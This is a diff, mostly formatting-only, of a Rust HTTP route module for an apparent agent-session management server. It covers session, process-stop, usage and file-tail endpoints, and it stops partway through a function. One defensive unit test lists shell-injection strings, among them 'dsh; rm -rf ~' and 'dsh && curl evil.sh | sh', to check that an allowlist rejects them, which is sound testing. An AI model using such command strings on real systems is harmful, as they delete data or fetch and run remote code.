@@ -24,9 +24,8 @@ pub(crate) fn route_fleet_skill(request: tiny_http::Request) {
     let header: tiny_http::Header = "Content-Type: text/markdown; charset=utf-8"
         .parse()
         .unwrap();
-    let _ = request.respond(
-        tiny_http::Response::from_string(crate::FLEET_SKILL_MD).with_header(header),
-    );
+    let _ = request
+        .respond(tiny_http::Response::from_string(crate::FLEET_SKILL_MD).with_header(header));
 }
 
 /// The git commit this server build came from, 7 chars, or `"unknown"`.
@@ -51,7 +50,9 @@ pub(crate) fn build_commit() -> String {
             return v.chars().take(7).collect();
         }
     }
-    option_env!("FLEET_GIT_COMMIT").unwrap_or("unknown").to_string()
+    option_env!("FLEET_GIT_COMMIT")
+        .unwrap_or("unknown")
+        .to_string()
 }
 
 /// The version this server reports. Same two-source shape as [`build_commit`]:
@@ -100,11 +101,9 @@ pub(crate) fn route_health(
     json_header: tiny_http::Header,
     path: &str,
 ) {
-
-                let _ = request.respond(
-                    tiny_http::Response::from_string(health_body()).with_header(json_header),
-                );
-            }
+    let _ =
+        request.respond(tiny_http::Response::from_string(health_body()).with_header(json_header));
+}
 
 pub(crate) fn route_sessions(
     ctx: &ServeCtx,
@@ -116,18 +115,16 @@ pub(crate) fn route_sessions(
     let sources = ctx.sources;
     let search_index = ctx.search_index;
 
-                let sessions = ctx.snapshot.sessions();
-                // Incrementally update the search index with the latest session list.
-                let pairs: Vec<(String, String)> = sessions
-                    .iter()
-                    .map(|s| (s.jsonl_path.clone(), s.id.clone()))
-                    .collect();
-                search_index.index_batch(&pairs);
-                let body = serde_json::to_string(&sessions).unwrap_or_default();
-                let _ = request.respond(
-                    tiny_http::Response::from_string(body).with_header(json_header),
-                );
-            }
+    let sessions = ctx.snapshot.sessions();
+    // Incrementally update the search index with the latest session list.
+    let pairs: Vec<(String, String)> = sessions
+        .iter()
+        .map(|s| (s.jsonl_path.clone(), s.id.clone()))
+        .collect();
+    search_index.index_batch(&pairs);
+    let body = serde_json::to_string(&sessions).unwrap_or_default();
+    let _ = request.respond(tiny_http::Response::from_string(body).with_header(json_header));
+}
 
 /// `/interrupt_agent_session?path=<uri>` — stop one session through its own
 /// source, for the sources with no per-session process to signal (dsh).
@@ -148,8 +145,8 @@ pub(crate) fn route_interrupt_agent_session(
         }
         Err(e) => {
             let body = serde_json::json!({ "error": e }).to_string();
-            let _ = request
-                .respond(tiny_http::Response::from_string(body).with_header(json_header));
+            let _ =
+                request.respond(tiny_http::Response::from_string(body).with_header(json_header));
         }
     }
 }
@@ -161,29 +158,27 @@ pub(crate) fn route_interrupt(
     json_header: tiny_http::Header,
     path: &str,
 ) {
-
-                let pid: u32 = query.get("pid").and_then(|s| s.parse().ok()).unwrap_or(0);
-                if pid == 0 {
-                    let _ = request.respond(tiny_http::Response::empty(400));
-                    return;
-                }
-                match crate::session::interrupt_pid_impl(pid) {
-                    Ok(()) => {
-                        let _ = request.respond(
-                            tiny_http::Response::from_string(r#"{"ok":true}"#)
-                                .with_header(json_header),
-                        );
-                    }
-                    Err(e) => {
-                        let body = format!(r#"{{"error":"{}"}}"#, e);
-                        let _ = request.respond(
-                            tiny_http::Response::from_string(body)
-                                .with_status_code(500)
-                                .with_header(json_header),
-                        );
-                    }
-                }
-            }
+    let pid: u32 = query.get("pid").and_then(|s| s.parse().ok()).unwrap_or(0);
+    if pid == 0 {
+        let _ = request.respond(tiny_http::Response::empty(400));
+        return;
+    }
+    match crate::session::interrupt_pid_impl(pid) {
+        Ok(()) => {
+            let _ = request.respond(
+                tiny_http::Response::from_string(r#"{"ok":true}"#).with_header(json_header),
+            );
+        }
+        Err(e) => {
+            let body = format!(r#"{{"error":"{}"}}"#, e);
+            let _ = request.respond(
+                tiny_http::Response::from_string(body)
+                    .with_status_code(500)
+                    .with_header(json_header),
+            );
+        }
+    }
+}
 
 pub(crate) fn route_stop(
     ctx: &ServeCtx,
@@ -192,49 +187,47 @@ pub(crate) fn route_stop(
     json_header: tiny_http::Header,
     path: &str,
 ) {
-
-                let pid: u32 = query.get("pid").and_then(|s| s.parse().ok()).unwrap_or(0);
-                if pid == 0 {
-                    let _ = request.respond(tiny_http::Response::empty(400));
-                    return;
-                }
-                let force: bool = query.get("force").map(|s| s == "true").unwrap_or(false);
-                // Probe first so a stale pid still 500s; then take the whole
-                // tree, or the agent's tool children outlive it.
-                //
-                // The probe is unix-only: on Windows `taskkill` reports an
-                // unknown pid through its own non-zero exit, so `kill_pid_tree`
-                // returns the Err and the same 500 comes out below. Gating the
-                // *route* on unix is what used to make this 400 on Windows even
-                // though the kill itself has had a taskkill path all along.
-                #[cfg(unix)]
-                if unsafe { libc::kill(pid as libc::pid_t, 0) } != 0 {
-                    let err = std::io::Error::last_os_error().to_string();
-                    let body = format!(r#"{{"error":"{}"}}"#, err);
-                    let _ = request.respond(
-                        tiny_http::Response::from_string(body)
-                            .with_status_code(500)
-                            .with_header(json_header),
-                    );
-                    return;
-                }
-                match crate::session::kill_pid_tree(pid, force) {
-                    Ok(()) => {
-                        let _ = request.respond(
-                            tiny_http::Response::from_string(r#"{"ok":true}"#)
-                                .with_header(json_header),
-                        );
-                    }
-                    Err(e) => {
-                        let body = format!(r#"{{"error":"{}"}}"#, e);
-                        let _ = request.respond(
-                            tiny_http::Response::from_string(body)
-                                .with_status_code(500)
-                                .with_header(json_header),
-                        );
-                    }
-                }
-            }
+    let pid: u32 = query.get("pid").and_then(|s| s.parse().ok()).unwrap_or(0);
+    if pid == 0 {
+        let _ = request.respond(tiny_http::Response::empty(400));
+        return;
+    }
+    let force: bool = query.get("force").map(|s| s == "true").unwrap_or(false);
+    // Probe first so a stale pid still 500s; then take the whole
+    // tree, or the agent's tool children outlive it.
+    //
+    // The probe is unix-only: on Windows `taskkill` reports an
+    // unknown pid through its own non-zero exit, so `kill_pid_tree`
+    // returns the Err and the same 500 comes out below. Gating the
+    // *route* on unix is what used to make this 400 on Windows even
+    // though the kill itself has had a taskkill path all along.
+    #[cfg(unix)]
+    if unsafe { libc::kill(pid as libc::pid_t, 0) } != 0 {
+        let err = std::io::Error::last_os_error().to_string();
+        let body = format!(r#"{{"error":"{}"}}"#, err);
+        let _ = request.respond(
+            tiny_http::Response::from_string(body)
+                .with_status_code(500)
+                .with_header(json_header),
+        );
+        return;
+    }
+    match crate::session::kill_pid_tree(pid, force) {
+        Ok(()) => {
+            let _ = request.respond(
+                tiny_http::Response::from_string(r#"{"ok":true}"#).with_header(json_header),
+            );
+        }
+        Err(e) => {
+            let body = format!(r#"{{"error":"{}"}}"#, e);
+            let _ = request.respond(
+                tiny_http::Response::from_string(body)
+                    .with_status_code(500)
+                    .with_header(json_header),
+            );
+        }
+    }
+}
 
 pub(crate) fn route_stop_workspace(
     ctx: &ServeCtx,
@@ -243,32 +236,30 @@ pub(crate) fn route_stop_workspace(
     json_header: tiny_http::Header,
     path: &str,
 ) {
-
-                let path_param = query
-                    .get("path")
-                    .map(|s| percent_decode_str(s).decode_utf8_lossy().to_string())
-                    .unwrap_or_default();
-                if path_param.is_empty() {
-                    let _ = request.respond(tiny_http::Response::empty(400));
-                    return;
-                }
-                match crate::session::kill_workspace_impl(&path_param) {
-                    Ok(()) => {
-                        let _ = request.respond(
-                            tiny_http::Response::from_string(r#"{"ok":true}"#)
-                                .with_header(json_header),
-                        );
-                    }
-                    Err(e) => {
-                        let body = format!(r#"{{"error":"{}"}}"#, e.replace('"', "'"));
-                        let _ = request.respond(
-                            tiny_http::Response::from_string(body)
-                                .with_status_code(500)
-                                .with_header(json_header),
-                        );
-                    }
-                }
-            }
+    let path_param = query
+        .get("path")
+        .map(|s| percent_decode_str(s).decode_utf8_lossy().to_string())
+        .unwrap_or_default();
+    if path_param.is_empty() {
+        let _ = request.respond(tiny_http::Response::empty(400));
+        return;
+    }
+    match crate::session::kill_workspace_impl(&path_param) {
+        Ok(()) => {
+            let _ = request.respond(
+                tiny_http::Response::from_string(r#"{"ok":true}"#).with_header(json_header),
+            );
+        }
+        Err(e) => {
+            let body = format!(r#"{{"error":"{}"}}"#, e.replace('"', "'"));
+            let _ = request.respond(
+                tiny_http::Response::from_string(body)
+                    .with_status_code(500)
+                    .with_header(json_header),
+            );
+        }
+    }
+}
 
 pub(crate) fn route_sources_prefix(
     ctx: &ServeCtx,
@@ -279,58 +270,57 @@ pub(crate) fn route_sources_prefix(
 ) {
     let sources = ctx.sources;
 
-                let parts: Vec<&str> = path.trim_start_matches('/').split('/').collect();
-                // Expected: ["sources", "<name>", "account"|"usage"]
-                if parts.len() == 3 {
-                    let source_name = parts[1];
-                    let kind = parts[2];
+    let parts: Vec<&str> = path.trim_start_matches('/').split('/').collect();
+    // Expected: ["sources", "<name>", "account"|"usage"]
+    if parts.len() == 3 {
+        let source_name = parts[1];
+        let kind = parts[2];
 
-                    // Check sources config before serving
-                    let config = crate::agent_source::SourcesConfig::load();
-                    if !config.is_source_enabled(source_name) {
-                        let body = format!(r#"{{"error":"Source '{}' is disabled"}}"#, source_name);
-                        let _ = request.respond(
-                            tiny_http::Response::from_string(body)
-                                .with_status_code(403)
-                                .with_header(json_header),
-                        );
-                        return;
-                    }
+        // Check sources config before serving
+        let config = crate::agent_source::SourcesConfig::load();
+        if !config.is_source_enabled(source_name) {
+            let body = format!(r#"{{"error":"Source '{}' is disabled"}}"#, source_name);
+            let _ = request.respond(
+                tiny_http::Response::from_string(body)
+                    .with_status_code(403)
+                    .with_header(json_header),
+            );
+            return;
+        }
 
-                    if let Some(source) = agent_source::find_source_by_api_name(sources, source_name) {
-                        let result = match kind {
-                            "account" => source.fetch_account(),
-                            "usage" => source.fetch_usage(),
-                            _ => Err(format!("Unknown endpoint: {kind}")),
-                        };
-                        match result {
-                            Ok(val) => {
-                                let body = serde_json::to_string(&val).unwrap_or_default();
-                                let _ = request.respond(
-                                    tiny_http::Response::from_string(body).with_header(json_header),
-                                );
-                            }
-                            Err(e) => {
-                                let body = format!(r#"{{"error":"{}"}}"#, e.replace('"', "\\\""));
-                                let _ = request.respond(
-                                    tiny_http::Response::from_string(body)
-                                        .with_status_code(404)
-                                        .with_header(json_header),
-                                );
-                            }
-                        }
-                    } else {
-                        let body = format!(r#"{{"error":"Unknown source: {}"}}"#, source_name);
-                        let _ = request.respond(
-                            tiny_http::Response::from_string(body)
-                                .with_status_code(404)
-                                .with_header(json_header),
-                        );
-                    }
-                } else {
-                    let _ = request.respond(tiny_http::Response::empty(404));
+        if let Some(source) = agent_source::find_source_by_api_name(sources, source_name) {
+            let result = match kind {
+                "account" => source.fetch_account(),
+                "usage" => source.fetch_usage(),
+                _ => Err(format!("Unknown endpoint: {kind}")),
+            };
+            match result {
+                Ok(val) => {
+                    let body = serde_json::to_string(&val).unwrap_or_default();
+                    let _ = request
+                        .respond(tiny_http::Response::from_string(body).with_header(json_header));
+                }
+                Err(e) => {
+                    let body = format!(r#"{{"error":"{}"}}"#, e.replace('"', "\\\""));
+                    let _ = request.respond(
+                        tiny_http::Response::from_string(body)
+                            .with_status_code(404)
+                            .with_header(json_header),
+                    );
                 }
             }
+        } else {
+            let body = format!(r#"{{"error":"Unknown source: {}"}}"#, source_name);
+            let _ = request.respond(
+                tiny_http::Response::from_string(body)
+                    .with_status_code(404)
+                    .with_header(json_header),
+            );
+        }
+    } else {
+        let _ = request.respond(tiny_http::Response::empty(404));
+    }
+}
 
 pub(crate) fn route_harness_statuses(
     _ctx: &ServeCtx,
@@ -341,9 +331,7 @@ pub(crate) fn route_harness_statuses(
 ) {
     let statuses = crate::harness_status::probe_all();
     let body = serde_json::to_string(&statuses).unwrap_or_default();
-    let _ = request.respond(
-        tiny_http::Response::from_string(body).with_header(json_header),
-    );
+    let _ = request.respond(tiny_http::Response::from_string(body).with_header(json_header));
 }
 
 /// The three harness sources `fleet harness` accepts, spelled exactly as
@@ -394,8 +382,8 @@ fn route_harness_action(
     let req = serde_json::from_str::<Req>(&buf).unwrap_or_default();
 
     let result = (|| -> Result<crate::proc_runner::ProcRecord, String> {
-        let exe = std::env::current_exe()
-            .map_err(|e| format!("cannot locate fleet binary: {e}"))?;
+        let exe =
+            std::env::current_exe().map_err(|e| format!("cannot locate fleet binary: {e}"))?;
         let args = match action {
             HarnessAction::InstallNode => "harness install-node".to_string(),
             HarnessAction::Install | HarnessAction::Update => {
@@ -429,7 +417,8 @@ fn route_harness_action(
 
     match result {
         Ok(body) => {
-            let _ = request.respond(tiny_http::Response::from_string(body).with_header(json_header));
+            let _ =
+                request.respond(tiny_http::Response::from_string(body).with_header(json_header));
         }
         Err(e) => {
             let body = serde_json::json!({ "error": e }).to_string();
@@ -493,7 +482,13 @@ mod harness_action_tests {
     /// matched constant, so anything not in this list cannot be interpolated.
     #[test]
     fn shell_metacharacter_payloads_are_not_allowlisted() {
-        for evil in ["dsh; rm -rf ~", "dsh && curl evil.sh | sh", "$(whoami)", "`id`", ""] {
+        for evil in [
+            "dsh; rm -rf ~",
+            "dsh && curl evil.sh | sh",
+            "$(whoami)",
+            "`id`",
+            "",
+        ] {
             assert!(
                 !INSTALLABLE_SOURCES.contains(&evil),
                 "{evil:?} must not be allowlisted"
@@ -511,27 +506,25 @@ pub(crate) fn route_setup_status(
 ) {
     let sources = ctx.sources;
 
-                let sessions = ctx.snapshot.sessions();
-                let detected_tools = crate::detect_installed_tools(&sessions);
-                let (cli_installed, cli_path) = crate::check_cli_installed();
-                let claude_dir_exists = get_claude_dir().map_or(false, |d| d.is_dir());
-                let logged_in = crate::account::read_keychain_credentials().is_ok();
-                let has_sessions = !sessions.is_empty();
+    let sessions = ctx.snapshot.sessions();
+    let detected_tools = crate::detect_installed_tools(&sessions);
+    let (cli_installed, cli_path) = crate::check_cli_installed();
+    let claude_dir_exists = get_claude_dir().map_or(false, |d| d.is_dir());
+    let logged_in = crate::account::read_keychain_credentials().is_ok();
+    let has_sessions = !sessions.is_empty();
 
-                let status = crate::ui_types::SetupStatus {
-                    cli_installed,
-                    cli_path,
-                    claude_dir_exists,
-                    detected_tools,
-                    logged_in,
-                    has_sessions,
-                    credentials_valid: None,
-                };
-                let body = serde_json::to_string(&status).unwrap_or_default();
-                let _ = request.respond(
-                    tiny_http::Response::from_string(body).with_header(json_header),
-                );
-            }
+    let status = crate::ui_types::SetupStatus {
+        cli_installed,
+        cli_path,
+        claude_dir_exists,
+        detected_tools,
+        logged_in,
+        has_sessions,
+        credentials_valid: None,
+    };
+    let body = serde_json::to_string(&status).unwrap_or_default();
+    let _ = request.respond(tiny_http::Response::from_string(body).with_header(json_header));
+}
 
 pub(crate) fn route_usage_summaries(
     ctx: &ServeCtx,
@@ -542,12 +535,10 @@ pub(crate) fn route_usage_summaries(
 ) {
     let sources = ctx.sources;
 
-                let summaries = crate::agent_source::fetch_usage_summaries_from_sources(sources);
-                let body = serde_json::to_string(&summaries).unwrap_or_default();
-                let _ = request.respond(
-                    tiny_http::Response::from_string(body).with_header(json_header),
-                );
-            }
+    let summaries = crate::agent_source::fetch_usage_summaries_from_sources(sources);
+    let body = serde_json::to_string(&summaries).unwrap_or_default();
+    let _ = request.respond(tiny_http::Response::from_string(body).with_header(json_header));
+}
 
 pub(crate) fn route_today_usage(
     ctx: &ServeCtx,
@@ -558,13 +549,11 @@ pub(crate) fn route_today_usage(
 ) {
     let sources = ctx.sources;
 
-                let sessions = ctx.snapshot.sessions();
-                let usage = crate::today_usage::today_usage(&sessions);
-                let body = serde_json::to_string(&usage).unwrap_or_default();
-                let _ = request.respond(
-                    tiny_http::Response::from_string(body).with_header(json_header),
-                );
-            }
+    let sessions = ctx.snapshot.sessions();
+    let usage = crate::today_usage::today_usage(&sessions);
+    let body = serde_json::to_string(&usage).unwrap_or_default();
+    let _ = request.respond(tiny_http::Response::from_string(body).with_header(json_header));
+}
 
 pub(crate) fn route_cloud_usage(
     ctx: &ServeCtx,
@@ -625,32 +614,30 @@ pub(crate) fn route_session_decisions(
 ) {
     let sources = ctx.sources;
 
-                let raw_id = query.get("session_id").map(|s| s.as_str()).unwrap_or("");
-                let session_id = percent_decode_str(raw_id).decode_utf8_lossy().to_string();
-                let jsonl_path = query.get("jsonl_path").map(|s| {
-                    percent_decode_str(s.as_str()).decode_utf8_lossy().to_string()
-                });
-                let resolved = if jsonl_path.is_none() {
-                    ctx.snapshot.sessions()
-                        .into_iter()
-                        .find(|s| s.id == session_id)
-                        .map(|s| s.jsonl_path)
-                } else {
-                    None
-                };
-                let path = jsonl_path
-                    .as_deref()
-                    .or(resolved.as_deref())
-                    .map(std::path::Path::new);
-                let records = crate::decision_history::list_session_records_with_jsonl(
-                    &session_id,
-                    path,
-                );
-                let body = serde_json::to_string(&records).unwrap_or_else(|_| "[]".to_string());
-                let _ = request.respond(
-                    tiny_http::Response::from_string(body).with_header(json_header),
-                );
-            }
+    let raw_id = query.get("session_id").map(|s| s.as_str()).unwrap_or("");
+    let session_id = percent_decode_str(raw_id).decode_utf8_lossy().to_string();
+    let jsonl_path = query.get("jsonl_path").map(|s| {
+        percent_decode_str(s.as_str())
+            .decode_utf8_lossy()
+            .to_string()
+    });
+    let resolved = if jsonl_path.is_none() {
+        ctx.snapshot
+            .sessions()
+            .into_iter()
+            .find(|s| s.id == session_id)
+            .map(|s| s.jsonl_path)
+    } else {
+        None
+    };
+    let path = jsonl_path
+        .as_deref()
+        .or(resolved.as_deref())
+        .map(std::path::Path::new);
+    let records = crate::decision_history::list_session_records_with_jsonl(&session_id, path);
+    let body = serde_json::to_string(&records).unwrap_or_else(|_| "[]".to_string());
+    let _ = request.respond(tiny_http::Response::from_string(body).with_header(json_header));
+}
 
 pub(crate) fn route_messages(
     ctx: &ServeCtx,
@@ -661,36 +648,35 @@ pub(crate) fn route_messages(
 ) {
     let sources = ctx.sources;
 
-                let raw_path = query.get("path").map(|s| s.as_str()).unwrap_or("");
-                let file_path = percent_decode_str(raw_path).decode_utf8_lossy().to_string();
-                let tail: Option<usize> = query.get("tail").and_then(|s| s.parse().ok());
-                if let Some(source) = find_source_for_path(sources, &file_path) {
-                    let result = match tail {
-                        Some(n) => source.get_messages_tail(&file_path, n),
-                        None => source.get_messages(&file_path),
-                    };
-                    match result {
-                        Ok(mut messages) => {
-                            // Trim oversized tool output before it crosses the
-                            // HTTP boundary, mirroring LocalBackend. Only the
-                            // tail path (SessionDetail) is trimmed; a full
-                            // `get_messages` fetch keeps everything intact.
-                            if tail.is_some() {
-                                crate::message_trim::trim_messages_for_transport(&mut messages);
-                            }
-                            let body = serde_json::to_string(&messages).unwrap_or_default();
-                            let _ = request.respond(
-                                tiny_http::Response::from_string(body).with_header(json_header),
-                            );
-                        }
-                        Err(_) => {
-                            let _ = request.respond(tiny_http::Response::empty(404));
-                        }
-                    }
-                } else {
-                    let _ = request.respond(tiny_http::Response::empty(404));
+    let raw_path = query.get("path").map(|s| s.as_str()).unwrap_or("");
+    let file_path = percent_decode_str(raw_path).decode_utf8_lossy().to_string();
+    let tail: Option<usize> = query.get("tail").and_then(|s| s.parse().ok());
+    if let Some(source) = find_source_for_path(sources, &file_path) {
+        let result = match tail {
+            Some(n) => source.get_messages_tail(&file_path, n),
+            None => source.get_messages(&file_path),
+        };
+        match result {
+            Ok(mut messages) => {
+                // Trim oversized tool output before it crosses the
+                // HTTP boundary, mirroring LocalBackend. Only the
+                // tail path (SessionDetail) is trimmed; a full
+                // `get_messages` fetch keeps everything intact.
+                if tail.is_some() {
+                    crate::message_trim::trim_messages_for_transport(&mut messages);
                 }
+                let body = serde_json::to_string(&messages).unwrap_or_default();
+                let _ = request
+                    .respond(tiny_http::Response::from_string(body).with_header(json_header));
             }
+            Err(_) => {
+                let _ = request.respond(tiny_http::Response::empty(404));
+            }
+        }
+    } else {
+        let _ = request.respond(tiny_http::Response::empty(404));
+    }
+}
 
 /// Full, untrimmed tool output for one `tool_use_id`. The remote counterpart of
 /// `Backend::get_tool_result_full`, called when the reader expands a card whose
@@ -711,9 +697,8 @@ pub(crate) fn route_tool_result(
     ) {
         Ok(value) => {
             let body = serde_json::to_string(&value).unwrap_or_default();
-            let _ = request.respond(
-                tiny_http::Response::from_string(body).with_header(json_header),
-            );
+            let _ =
+                request.respond(tiny_http::Response::from_string(body).with_header(json_header));
         }
         Err(_) => {
             let _ = request.respond(tiny_http::Response::empty(404));
@@ -730,19 +715,16 @@ pub(crate) fn route_file_size(
 ) {
     let sources = ctx.sources;
 
-                let raw_path = query.get("path").map(|s| s.as_str()).unwrap_or("");
-                let uri = percent_decode_str(raw_path).decode_utf8_lossy().to_string();
-                let resolved = find_source_for_path(sources, &uri)
-                    .and_then(|s| s.resolve_file_path(&uri));
-                let size = resolved
-                    .and_then(|p| std::fs::metadata(&p).ok())
-                    .map(|m| m.len())
-                    .unwrap_or(0);
-                let body = format!(r#"{{"size":{}}}"#, size);
-                let _ = request.respond(
-                    tiny_http::Response::from_string(body).with_header(json_header),
-                );
-            }
+    let raw_path = query.get("path").map(|s| s.as_str()).unwrap_or("");
+    let uri = percent_decode_str(raw_path).decode_utf8_lossy().to_string();
+    let resolved = find_source_for_path(sources, &uri).and_then(|s| s.resolve_file_path(&uri));
+    let size = resolved
+        .and_then(|p| std::fs::metadata(&p).ok())
+        .map(|m| m.len())
+        .unwrap_or(0);
+    let body = format!(r#"{{"size":{}}}"#, size);
+    let _ = request.respond(tiny_http::Response::from_string(body).with_header(json_header));
+}
 
 pub(crate) fn route_tail(
     ctx: &ServeCtx,
@@ -753,48 +735,47 @@ pub(crate) fn route_tail(
 ) {
     let sources = ctx.sources;
 
-                let raw_path = query.get("path").map(|s| s.as_str()).unwrap_or("");
-                let uri = percent_decode_str(raw_path).decode_utf8_lossy().to_string();
-                let offset: u64 = query
-                    .get("offset")
-                    .and_then(|s| s.parse().ok())
-                    .unwrap_or(0);
+    let raw_path = query.get("path").map(|s| s.as_str()).unwrap_or("");
+    let uri = percent_decode_str(raw_path).decode_utf8_lossy().to_string();
+    let offset: u64 = query
+        .get("offset")
+        .and_then(|s| s.parse().ok())
+        .unwrap_or(0);
 
-                let Some(source) = find_source_for_path(sources, &uri) else {
-                    let _ = request.respond(tiny_http::Response::empty(404));
-                    return;
-                };
+    let Some(source) = find_source_for_path(sources, &uri) else {
+        let _ = request.respond(tiny_http::Response::empty(404));
+        return;
+    };
 
-                // Source-aware incremental follow (the HTTP live-tail surface,
-                // mirroring the mobile relay `serve_tail_delta` and the desktop
-                // `emit_tail_lines`): Claude gets the byte-offset raw
-                // tail; Codex re-normalizes its folded rollout so the emitted
-                // `session-tail` rows are renderable messages the desktop dedups
-                // by their stable `uuid`. A raw byte slice of a Codex rollout is
-                // not a message — the old code here emitted un-renderable
-                // `response_item` records (the "reply never shows" bug).
-                match source.tail_incremental(&uri, offset) {
-                    Ok((mut lines, new_offset)) => {
-                        // Collapse oversized tool output (e.g. a Claude `Read` of
-                        // an image → huge base64) to a marked preview before it
-                        // crosses the wire, matching `/messages?tail=N` and the
-                        // desktop watcher; the full payload is recovered via
-                        // `get_tool_result_full` only when the row is expanded.
-                        crate::message_trim::trim_messages_for_transport(&mut lines);
-                        let body = serde_json::json!({
-                            "lines": lines,
-                            "newOffset": new_offset
-                        })
-                        .to_string();
-                        let _ = request.respond(
-                            tiny_http::Response::from_string(body).with_header(json_header),
-                        );
-                    }
-                    Err(_) => {
-                        let _ = request.respond(tiny_http::Response::empty(404));
-                    }
-                }
-            }
+    // Source-aware incremental follow (the HTTP live-tail surface,
+    // mirroring the mobile relay `serve_tail_delta` and the desktop
+    // `emit_tail_lines`): Claude gets the byte-offset raw
+    // tail; Codex re-normalizes its folded rollout so the emitted
+    // `session-tail` rows are renderable messages the desktop dedups
+    // by their stable `uuid`. A raw byte slice of a Codex rollout is
+    // not a message — the old code here emitted un-renderable
+    // `response_item` records (the "reply never shows" bug).
+    match source.tail_incremental(&uri, offset) {
+        Ok((mut lines, new_offset)) => {
+            // Collapse oversized tool output (e.g. a Claude `Read` of
+            // an image → huge base64) to a marked preview before it
+            // crosses the wire, matching `/messages?tail=N` and the
+            // desktop watcher; the full payload is recovered via
+            // `get_tool_result_full` only when the row is expanded.
+            crate::message_trim::trim_messages_for_transport(&mut lines);
+            let body = serde_json::json!({
+                "lines": lines,
+                "newOffset": new_offset
+            })
+            .to_string();
+            let _ =
+                request.respond(tiny_http::Response::from_string(body).with_header(json_header));
+        }
+        Err(_) => {
+            let _ = request.respond(tiny_http::Response::empty(404));
+        }
+    }
+}
 
 pub(crate) fn route_live_thinking(
     ctx: &ServeCtx,
@@ -803,18 +784,15 @@ pub(crate) fn route_live_thinking(
     json_header: tiny_http::Header,
     path: &str,
 ) {
-
-                let raw = query.get("session_id").map(|s| s.as_str()).unwrap_or("");
-                let session_id = percent_decode_str(raw).decode_utf8_lossy().to_string();
-                // Sidecars live on the machine running `fleet serve`, so read
-                // them directly rather than per-source. Serializes to `null`
-                // when there's no live sidecar for this session.
-                let lt = crate::live_thinking::read_live_thinking(&session_id);
-                let body = serde_json::to_string(&lt).unwrap_or_else(|_| "null".into());
-                let _ = request.respond(
-                    tiny_http::Response::from_string(body).with_header(json_header),
-                );
-            }
+    let raw = query.get("session_id").map(|s| s.as_str()).unwrap_or("");
+    let session_id = percent_decode_str(raw).decode_utf8_lossy().to_string();
+    // Sidecars live on the machine running `fleet serve`, so read
+    // them directly rather than per-source. Serializes to `null`
+    // when there's no live sidecar for this session.
+    let lt = crate::live_thinking::read_live_thinking(&session_id);
+    let body = serde_json::to_string(&lt).unwrap_or_else(|_| "null".into());
+    let _ = request.respond(tiny_http::Response::from_string(body).with_header(json_header));
+}
 
 /// `/session_images?session=<thread id>` — JSON list of a Codex session's
 /// generated images, so a remote desktop can populate its thumbnails.
@@ -853,7 +831,8 @@ pub(crate) fn route_session_image(
         Ok(f) => {
             let mime_header: tiny_http::Header =
                 format!("Content-Type: {}", f.mime).parse().unwrap();
-            let _ = request.respond(tiny_http::Response::from_data(f.bytes).with_header(mime_header));
+            let _ =
+                request.respond(tiny_http::Response::from_data(f.bytes).with_header(mime_header));
         }
         Err(_) => {
             let _ = request.respond(tiny_http::Response::empty(404));
@@ -868,27 +847,25 @@ pub(crate) fn route_decision_asset(
     json_header: tiny_http::Header,
     path: &str,
 ) {
-
-                let dec = |key: &str| {
-                    query
-                        .get(key)
-                        .map(|s| percent_decode_str(s).decode_utf8_lossy().to_string())
-                        .unwrap_or_default()
-                };
-                let (id, qidx, rel) = (dec("id"), dec("qidx"), dec("path"));
-                match crate::mcp_ipc::read_decision_asset(&id, &qidx, &rel) {
-                    Ok(f) => {
-                        let mime_header: tiny_http::Header =
-                            format!("Content-Type: {}", f.mime).parse().unwrap();
-                        let _ = request.respond(
-                            tiny_http::Response::from_data(f.bytes).with_header(mime_header),
-                        );
-                    }
-                    Err(_) => {
-                        let _ = request.respond(tiny_http::Response::empty(404));
-                    }
-                }
-            }
+    let dec = |key: &str| {
+        query
+            .get(key)
+            .map(|s| percent_decode_str(s).decode_utf8_lossy().to_string())
+            .unwrap_or_default()
+    };
+    let (id, qidx, rel) = (dec("id"), dec("qidx"), dec("path"));
+    match crate::mcp_ipc::read_decision_asset(&id, &qidx, &rel) {
+        Ok(f) => {
+            let mime_header: tiny_http::Header =
+                format!("Content-Type: {}", f.mime).parse().unwrap();
+            let _ =
+                request.respond(tiny_http::Response::from_data(f.bytes).with_header(mime_header));
+        }
+        Err(_) => {
+            let _ = request.respond(tiny_http::Response::empty(404));
+        }
+    }
+}
 
 /// `/decision_asset/<id>/<qidx>/<relpath…>` — the same bytes
 /// [`route_decision_asset`] answers, addressed as a path so the served
@@ -918,8 +895,8 @@ pub(crate) fn route_decision_asset_prefix(
         Ok(f) => {
             let mime_header: tiny_http::Header =
                 format!("Content-Type: {}", f.mime).parse().unwrap();
-            let _ = request
-                .respond(tiny_http::Response::from_data(f.bytes).with_header(mime_header));
+            let _ =
+                request.respond(tiny_http::Response::from_data(f.bytes).with_header(mime_header));
         }
         Err(_) => {
             let _ = request.respond(tiny_http::Response::empty(404));
@@ -934,29 +911,27 @@ pub(crate) fn route_review_doc(
     json_header: tiny_http::Header,
     path: &str,
 ) {
-
-                let mut body_bytes = Vec::new();
-                let _ = std::io::Read::read_to_end(&mut request.as_reader(), &mut body_bytes);
-                let resolved = serde_json::from_slice::<crate::mcp_ipc::ReviewDoc>(&body_bytes)
-                    .map_err(|e| format!("bad /review_doc body: {e}"))
-                    .and_then(|doc| crate::mcp_ipc::read_review_doc(&doc));
-                match resolved {
-                    Ok(content) => {
-                        let body = serde_json::to_string(&content).unwrap_or_default();
-                        let _ = request.respond(
-                            tiny_http::Response::from_string(body).with_header(json_header),
-                        );
-                    }
-                    Err(e) => {
-                        let body = serde_json::json!({ "error": e }).to_string();
-                        let _ = request.respond(
-                            tiny_http::Response::from_string(body)
-                                .with_status_code(400)
-                                .with_header(json_header),
-                        );
-                    }
-                }
-            }
+    let mut body_bytes = Vec::new();
+    let _ = std::io::Read::read_to_end(&mut request.as_reader(), &mut body_bytes);
+    let resolved = serde_json::from_slice::<crate::mcp_ipc::ReviewDoc>(&body_bytes)
+        .map_err(|e| format!("bad /review_doc body: {e}"))
+        .and_then(|doc| crate::mcp_ipc::read_review_doc(&doc));
+    match resolved {
+        Ok(content) => {
+            let body = serde_json::to_string(&content).unwrap_or_default();
+            let _ =
+                request.respond(tiny_http::Response::from_string(body).with_header(json_header));
+        }
+        Err(e) => {
+            let body = serde_json::json!({ "error": e }).to_string();
+            let _ = request.respond(
+                tiny_http::Response::from_string(body)
+                    .with_status_code(400)
+                    .with_header(json_header),
+            );
+        }
+    }
+}
 
 pub(crate) fn route_task_plans(
     ctx: &ServeCtx,
@@ -965,21 +940,18 @@ pub(crate) fn route_task_plans(
     json_header: tiny_http::Header,
     path: &str,
 ) {
-
